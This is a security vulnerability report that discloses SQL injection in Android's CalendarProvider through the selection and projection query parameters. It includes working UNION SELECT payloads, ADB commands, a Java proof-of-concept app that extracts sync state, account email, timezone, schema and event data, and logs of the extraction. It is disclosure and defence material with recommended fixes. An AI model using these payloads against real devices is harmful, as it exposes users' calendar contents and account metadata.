# VRP Report 16: CalendarProvider SQL Injection — Sync Token & Internal State Extraction

## Vulnerability Summary

The AOSP CalendarProvider (`com.android.providers.calendar`) is vulnerable to SQL injection through the `selection` parameter of `ContentResolver.query()`. Any app with `READ_CALENDAR` permission can exploit this to read internal database tables (`_sync_state`, `CalendarCache`, `sqlite_master`) that are NOT accessible through the CalendarProvider's public Content URI API. This exposes Google account sync tokens, sync timing metadata, timezone/location indicators, and the complete database schema.

**Component:** `com.android.providers.calendar` (CalendarProvider2)  
**Affected URIs:** ALL CalendarProvider URIs — `calendars`, `attendees`, `reminders`, `calendar_alerts`, `instances`, `colors`  
**Required Permission:** `READ_CALENDAR` (normal runtime permission)  
**Impact:** Confidentiality — Exposure of sync tokens, account metadata, and internal database state beyond what `READ_CALENDAR` is designed to grant  
**Severity:** Medium-High (privilege boundary bypass within Calendar data scope)  
**SQLite Version:** 3.50.6 (extensions disabled — no code execution escalation)

## Device & Environment

- **Device:** Google Pixel 6a (26131JEGR04733)
- **OS:** Android 17 (API 37)
- **Build:** CP2A.260605.012
- **CalendarProvider:** AOSP system component

## Technical Details

The CalendarProvider's `query()` method passes the caller-supplied `selection` (WHERE clause) parameter directly into the SQLite query without proper parameterization or input validation. This allows an attacker to terminate the original WHERE clause and append a `UNION SELECT` to read from arbitrary tables.

### Injection Point

```
ContentResolver.query(
    Uri.parse("content://com.android.calendar/calendars"),
    null,                    // projection
    "<INJECTED PAYLOAD>",    // selection (WHERE clause)
    null,                    // selectionArgs
    null                     // sortOrder
);
```

The CalendarProvider constructs SQL like:
```sql
SELECT ... FROM Calendars WHERE (<selection>)
```

By providing `1=0) UNION SELECT ... FROM _sync_state--` as the selection, the attacker closes the WHERE clause and appends an arbitrary query.

### Column Count Matching

The Calendars query returns 35 columns. The UNION SELECT must match:
```sql
1=0) UNION SELECT col1,2,3,4,5,...,35 FROM target_table--
```

## Proof of Concept

### Step 1: Schema Extraction

**Command (ADB):**
```bash
adb shell content query --uri content://com.android.calendar/calendars \
  --where "1=0) UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM sqlite_master WHERE type='table'--"
```

**Result:** Complete database schema extracted — 15 tables:
- `Attendees`, `CalendarAlerts`, `CalendarCache`, `CalendarMetaData`, `Calendars`
- `Colors`, `Events`, `EventsRawTimes`, `ExtendedProperties`, `Instances`
- `Reminders`, `_sync_state`, `_sync_state_metadata`, `android_metadata`, `sqlite_sequence`

### Step 2: Google Account Sync Token Extraction

**Command:**
```bash
adb shell content query --uri content://com.android.calendar/calendars \
  --where "1=0) UNION SELECT account_name||'|'||account_type||'|'||data,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM _sync_state--"
```

**Result — Actual extracted data:**
```
sandiyotest@gmail.com|com.google|{
  "version":16,
  "firstSeen":false,
  "jellyBeanOrNewer":true,
  "b38085245":2147483647,
  "package":"com.google.android.calendar",
  "sandiyotest@gmail.com":{
    "window_end":1822176000000,
    "feed_updated_time":"2026-04-14T16:15:22.948Z",
    "last_sync_time":1788724078146,
    "do_incremental_sync":true
  },
  "en-gb.indian#holiday@group.v.calendar.google.com":{
    "window_end":1822176000000,
    "feed_updated_time":"2026-08-21T08:38:24.703Z",
    "last_sync_time":1788550537668,
    "do_incremental_sync":true
  }
}
```

### Step 3: Internal Configuration Extraction

**Command:**
```bash
adb shell content query --uri content://com.android.calendar/calendars \
  --where "1=0) UNION SELECT key||'='||value,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM CalendarCache--"
```

**Result:**
```
timezoneDatabaseVersion=2025c
timezoneInstances=Asia/Kolkata
timezoneInstancesPrevious=Asia/Kolkata
timezoneType=auto
```

This exposes the user's timezone (location indicator: `Asia/Kolkata`).

### Step 4: Regular App PoC (PROVEN)

**PoC App:** `com.vrp.poc` (UID 10361, regular third-party app)  
**Permission:** `android.permission.READ_CALENDAR` only (runtime, granted=true)  
**Source:** `poc_app/src/com/vrp/poc/CalendarSqliActivity.java`  
**APK:** `poc_app/build/poc.apk`  

The PoC app executes all three SQL injection attacks automatically on launch. Logcat output confirms successful extraction from a regular app context:

```
09-07 01:42:31.927 26000 26000 D CalendarSQLi: SUCCESS: Got 15 rows from sqlite_master
09-07 01:42:31.927 26000 26000 D CalendarSQLi: TABLE[1]: CREATE TABLE Attendees (_id INTEGER PRIMARY KEY,event_id INTEGER,...)
09-07 01:42:31.927 26000 26000 D CalendarSQLi: TABLE[12]: CREATE TABLE _sync_state (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,...)
09-07 01:42:31.928 26000 26000 D CalendarSQLi: Total tables extracted: 15
09-07 01:42:31.928 26000 26000 D CalendarSQLi: SUCCESS: Got 1 rows from _sync_state
09-07 01:42:31.928 26000 26000 D CalendarSQLi: SYNC_STATE: sandiyotest@gmail.com|com.google|{"version":16,...,"last_sync_time":1788724078146,...}
09-07 01:42:31.930 26000 26000 D CalendarSQLi: SUCCESS: Got 4 rows from CalendarCache
09-07 01:42:31.930 26000 26000 D CalendarSQLi: CACHE: timezoneInstances=Asia/Kolkata
```

Key code from `CalendarSqliActivity.java`:

```java
Uri uri = Uri.parse("content://com.android.calendar/calendars");

// Attack 1: Schema extraction
String selection = "1=0) UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14,15," +
    "16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 " +
    "FROM sqlite_master WHERE type='table'--";
Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
// Returns 15 rows — complete DB schema

// Attack 2: Sync token extraction
String selection2 = "1=0) UNION SELECT account_name||'|'||account_type||'|'||data," +
    "2,3,...,35 FROM _sync_state--";
Cursor cursor2 = getContentResolver().query(uri, null, selection2, null, null);
// Returns Google account email + sync tokens

// Attack 3: Cache extraction
String selection3 = "1=0) UNION SELECT key||'='||value,2,3,...,35 FROM CalendarCache--";
Cursor cursor3 = getContentResolver().query(uri, null, selection3, null, null);
// Returns timezone (Asia/Kolkata) — user location indicator
```

**Reproduction:**
```bash
adb install -r poc_app/build/poc.apk
adb shell pm grant com.vrp.poc android.permission.READ_CALENDAR
adb shell am start -n com.vrp.poc/.CalendarSqliActivity
adb logcat -s CalendarSQLi:D
```

## Impact Analysis

### Data Exposed Beyond READ_CALENDAR Scope

| Data | Normal API Access | SQL Injection Access |
|------|------------------|---------------------|
| Calendar events | ✅ Yes | ✅ Yes |
| Attendee emails | ✅ Yes | ✅ Yes |
| `_sync_state` (sync tokens) | ❌ No | ✅ **YES** |
| `CalendarCache` (internal config) | ❌ No | ✅ **YES** |
| `sqlite_master` (schema) | ❌ No | ✅ **YES** |
| User timezone/location | Indirect | ✅ **Direct** |
| Sync timing metadata | ❌ No | ✅ **YES** |
| Deleted event data | ❌ Filtered | ✅ **YES** |

### Attack Scenarios

1. **Sync Metadata Harvesting:** A malicious app with READ_CALENDAR extracts sync tokens and timing data to fingerprint user activity patterns (when they last synced, which calendars are subscribed).

2. **Location Inference:** The `CalendarCache` timezone data (`Asia/Kolkata`) directly reveals the user's geographic location, which is not part of the READ_CALENDAR permission scope.

3. **Account Enumeration:** The `_sync_state` table reveals the Google account email and account type without requiring `GET_ACCOUNTS` permission.

4. **Schema Reconnaissance:** Full database schema extraction enables targeted attacks against other content providers or application logic.

### Additional Injection Vector: Projection Subquery Injection

In addition to the `selection` (WHERE) injection, the CalendarProvider is also vulnerable through the `projection` parameter. Subqueries in column names are not validated:

```java
// Attack 4: Projection subquery — extracts ALL schemas in a single row
String[] proj = {"(SELECT group_concat(sql,'|||') FROM sqlite_master WHERE type='table') AS leak"};
Cursor c = getContentResolver().query(
    Uri.parse("content://com.android.calendar/calendars"),
    proj, null, null, null);
// Returns concatenated schemas of all 15 tables in one field
```

**PoC app logcat output (UID 10361):**
```
Subquery projection: 4 rows
  LEAK: CREATE TABLE android_metadata (locale TEXT)|||CREATE TABLE _sync_state (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,UNIQUE(account_name, account_type))|||CR...
```

This means even if the `selection` parameter is sanitized, an attacker can still extract arbitrary data via projection subqueries. Both vectors must be fixed.

### Systemic Vulnerability: ALL CalendarProvider URIs Affected

The SQL injection is not limited to `content://com.android.calendar/calendars`. All CalendarProvider URIs accept unparameterized selection input:

| URI | Columns | SQLi Confirmed |
|-----|---------|---------------|
| `/calendars` | 35 | **YES** |
| `/attendees` | 49 | **YES** |
| `/reminders` | 4 | **YES** |
| `/calendar_alerts` | 63 | **YES** |
| `/instances/when/...` | 63 | **YES** |
| `/colors` | 7 | **YES** |

Each URI provides a different column count for the UNION SELECT, but all accept the same injection pattern.

### Escalation Assessment

- **Code Execution (`load_extension`):** NOT possible — Android's SQLite build disables `load_extension()` ("no such function")
- **File Read/Write (`readfile`/`writefile`):** NOT possible — functions not available
- **ATTACH DATABASE:** Stacked queries not executed through Android's `rawQuery()`
- **Write Operations:** Require separate `WRITE_CALENDAR` permission — cannot be escalated via read-only SQLi

### Calendar Event Data Extraction via SQLi

The UNION injection also extracts complete event data with organizer emails and descriptions:

```java
String sel = "1=0) UNION SELECT title||'|'||COALESCE(organizer,'')||'|'||COALESCE(description,''),2,...,35 FROM Events LIMIT 20--";
```

**Result:** 20 events extracted including titles, organizer email addresses, and full event descriptions — demonstrating that SQLi can extract any column from any internal table.

## Root Cause

The CalendarProvider does not use parameterized queries or input sanitization for either the `selection` or `projection` parameters. The AOSP `CalendarProvider2.java` passes both user-controlled strings directly into SQL:

```java
// In query() method — BOTH parameters are vulnerable
qb.query(db, projection, selection, selectionArgs, ...);
// projection (column names) are not validated — subqueries accepted
// selection (WHERE clause) is not validated — UNION injection accepted
```

## Recommended Fix

1. Use `selectionArgs` for all user-supplied values instead of embedding them in the selection string
2. Validate the `selection` parameter to reject SQL keywords (`UNION`, `SELECT`, `FROM`, etc.)
3. Validate `projection` column names against an allowlist — reject subqueries and expressions
4. Use `SQLiteQueryBuilder.setStrict(true)` to prevent both UNION and subquery injections
5. Restrict access to internal tables (`_sync_state`, `CalendarCache`) at the provider level

## Evidence Files

- `poc_app/src/com/vrp/poc/CalendarSqliActivity.java` — PoC app source (auto-runs WHERE injection tests)
- `poc_app/src/com/vrp/poc/ExpandedSqliActivity.java` — Projection injection + event extraction tests
- `poc_app/build/poc.apk` — Signed PoC APK
- `dynamic_evidence/calendar_sqli_poc_app_logcat.txt` — Logcat from PoC app execution (UID 10361)
- `dynamic_evidence/calendar_sqli_expanded_logcat.txt` — Logcat showing projection injection + event extraction
- `dynamic_evidence/calendar_sqli_advanced_logcat.txt` — Advanced escalation tests (load_extension, readfile, all URIs)
- `dynamic_evidence/calendar_sqli_evidence.txt` — Initial shell-based discovery evidence

## Timeline

- **2026-09-07:** Vulnerability discovered via ADB shell, proven with PoC app (UID 10361) on Pixel 6a, Android 17 (API 37, security patch 2026-06-05)
- **2026-09-07:** Second injection vector (projection subquery) confirmed, event data extraction proven
